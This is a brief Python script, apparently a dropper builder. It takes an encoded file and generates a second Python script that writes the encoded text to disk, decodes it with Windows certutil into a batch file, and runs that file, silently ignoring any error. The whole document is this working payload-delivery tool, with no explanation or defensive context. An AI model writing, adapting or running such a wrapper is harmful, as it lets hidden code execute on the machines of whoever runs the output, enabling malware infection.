#!/usr/bin/python3
filename = input("Enter encoded file location: ")
enc = open(str(filename)).read()
f = open(str(filename)+".py", "w")
f.write("#!/usr/bin/python3\n")
f.write("encoded = '''\n")
f.write(str(enc))
f.write("'''")
f.write('''
print(encoded)
open("encodedstring","w").write(encoded)
try:
    from subprocess import call
    call(["certutil", "-decode", "encodedstring", "unencoded.bat"])
    call(["unencoded.bat"])
except:
    pass
''')
f.close()
print(enc)
